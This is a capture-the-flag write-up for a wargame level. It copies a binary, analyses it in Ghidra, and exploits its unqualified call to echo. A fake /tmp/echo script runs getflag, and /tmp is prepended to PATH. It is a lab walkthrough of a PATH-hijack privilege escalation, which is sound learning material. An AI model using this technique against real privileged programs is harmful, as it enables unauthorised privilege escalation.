# Level03 Write-up

## Objective:

The goal of this level was to analyze an executable file and manipulate its behavior to retrieve the flag.

## Step-by-step process:

### Step 1: Retrieving the Executable

I started by using `scp` to securely transfer the `level03` executable from the remote system to my local machine for analysis:

```bash
scp -P 2222 level03@localhost:level03 level03
```

### Step 2: Analyzing the Executable with Ghidra

Next, I loaded the `level03` executable into _Ghidra_ for disassembly and analysis. Through this process, I discovered that the program calls the `echo` command.

### Step 3: Exploiting the `echo` Call

Since the program relies on the system's `echo` command, I decided to manipulate the `PATH` environment variable to make it use a custom script instead of the default `echo` command.

To do this, I created a fake `echo` script in the `/tmp` directory by running the following in a text editor:

```bash
vim /tmp/echo
```

In the editor, I inserted the following shell script to replace the `echo` functionality with the `getflag` command:

```bash
#!/bin/sh
getflag
```

Then, I made the script executable:

```bash
chmod +x /tmp/echo
```

### Step 4: Changing the `PATH` Variable

After creating the fake `echo` script, I modified the `PATH` variable so that the program would use the `/tmp` directory first when calling `echo`:

```bash
export PATH="/tmp:$PATH"
```

### Step 5: Running the Program

Finally, I executed the `level03` program:

```bash
./level03
```
